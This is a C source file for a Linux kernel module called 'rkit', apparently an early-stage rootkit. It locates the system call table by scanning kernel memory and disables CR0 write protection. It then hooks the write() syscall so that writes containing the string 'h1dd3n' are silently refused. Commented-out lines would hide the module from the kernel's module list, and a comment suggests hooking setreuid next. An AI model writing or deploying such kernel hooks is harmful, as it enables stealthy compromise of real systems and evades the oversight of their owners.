#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>

int rkit_init(void);
void rkit_exit(void);
module_init(rkit_init);
module_exit(rkit_exit);

#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef uint64_t psize;

asmlinkage ssize_t (*o_write)(int fd, const char __user *buff, ssize_t count);

psize *sys_call_table;
psize **find(void) {
    psize **sctable;
    psize i = START_CHECK;

    while (i < END_CHECK) {
        sctable = (psize **) i;
        if (sctable[__NR_close] == (psize *) sys_close) {
            return &sctable[0];
        }
        i += sizeof(void *);
    }
    return NULL;
}

asmlinkage ssize_t rkit_write(int fd, const char __user *buff, ssize_t count) {
    int r;
    char *proc_protect = "h1dd3n";
    char *kbuff = (char *) kmalloc(256, GFP_KERNEL);
    copy_from_user(kbuff, buff, 255);
    if (strstr(kbuff, proc_protect)) {
         kfree(kbuff);
         return EEXIST;
    }
    r = (*o_write)(fd, buff, count);
    kfree(kbuff);
    return r;
}

int rkit_init(void) {
    //list_del_init(&__this_module.list);
    //kobject_del(&THIS_MODULE->mkobj.kobj);

    if ((sys_call_table = (psize *) find())) {
	//same as printf except designed for use w/ kernel
        //printk always prints to the log file 
	printk("rkit: sys_call_table is at: %p\n", sys_call_table);
    } else {
        printk("rkit: sys_call_table not found\n");
    }

    write_cr0(read_cr0() & (~ 0x10000));
    //this is writiing to __NR_write, we might want to overwrite setreuid?
    o_write = (void *) xchg(&sys_call_table[__NR_write], (psize)rkit_write);
    write_cr0(read_cr0() | 0x10000);

    return 0;
}

void rkit_exit(void) {
    write_cr0(read_cr0() & (~ 0x10000));
    xchg(&sys_call_table[__NR_write], (psize)o_write);
    write_cr0(read_cr0() | 0x10000);
    printk("rkit: Module unloaded\n");
}
